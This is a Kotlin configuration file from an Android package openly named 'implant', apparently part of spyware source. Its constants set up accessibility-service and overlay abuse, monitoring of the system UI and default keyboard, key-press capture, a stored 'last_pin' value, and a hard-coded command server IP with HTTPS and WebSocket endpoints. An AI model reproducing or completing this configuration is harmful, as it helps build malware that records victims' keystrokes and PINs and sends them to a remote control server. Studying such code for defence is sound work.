package com.cooperthecoder.implant

import com.cooperthecoder.implant.dagger.DaggerService

object Config {
    const val OVERLAY_DELAY: Long = 2000L
    @JvmField val ACCESSIBILITY_SERVICE_CLASS = DaggerService::class.java
    const val ACCESSIBILITY_SETTINGS_HEIGHT = 240
    const val ACCESSIBILITY_SETTINGS_TOP_PADDING = 240
    const val SYSTEMUI_PACKAGE_NAME = "com.android.systemui"
    const val SHARED_PREFERENCES_NAME = "screen_state"
    const val KEYBOARD_PACKAGE_NAME = "com.android.inputmethod.latin"
    const val KEY_PRESS_TIMEOUT = 150L
    const val KEYBOARD_DISMISSED_TEXT = "[keyboard hidden]"
    const val PREFS_KEY_LAST_PIN = "last_pin"
    const val DEBUG = true
    const val COMMAND_SERVER = "188.226.135.191"
    const val HTTPS_ENDPOINT = "https://$COMMAND_SERVER:4444"
    const val WEBSOCKETS_ENDPOINT = "ws://$COMMAND_SERVER:8080"
}

